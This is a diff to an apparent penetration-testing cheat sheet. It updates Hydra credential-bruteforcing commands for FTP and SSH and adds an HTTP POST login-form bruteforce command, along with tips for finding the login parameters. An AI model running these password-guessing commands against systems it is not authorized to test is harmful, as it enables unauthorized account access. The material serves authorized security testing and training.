@@ -320,18 +320,21 @@ curl -v -X OPTIONS http://website/directory
 ## Credential bruteforcing
 #### Hydra FTP
 ```
-hydra -L <USERNAMELIST> -P <PASSWORDLIST> -t 24 ftp://<IP>:<PORT>
+hydra -L <USERNAMEFILE> -P <PASSWORDFILE> -t 24 ftp://<IP>:<PORT>
 ```
 
 #### Hydra SSH
 ```
-hydra -L <USERNAMELIST> -P <PASSWORDLIST> -t 24 ssh://<IP>:<PORT>
+hydra -L <USERNAMEFILE> -P <PASSWORDFILE> -t 24 ssh://<IP>:<PORT>
 ```
 
 #### Hydra HTTP login
+Login using Burp or check in developers tools to check the request for the required information! You need to get the username/password/login parameter and the error message!
+
 https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/
 ```
-
+hydra -L <USERNAMEFILE> -P <PASSWORDFILE> <IP> http-post-form "<LOGINPAGE>:<USERNAME PARAMETER>=^USER^&<PASSWORD PARAMETER>=^PASS^&<LOGIN PARAMETER>:<Error Message>"
+#EXAMPLE hydra -l <USER> -p <Password> <IP Address> http-post-form “<Login Page>:<Request Body>:<Error Message>”
 ```
 
 # Post Exploitation
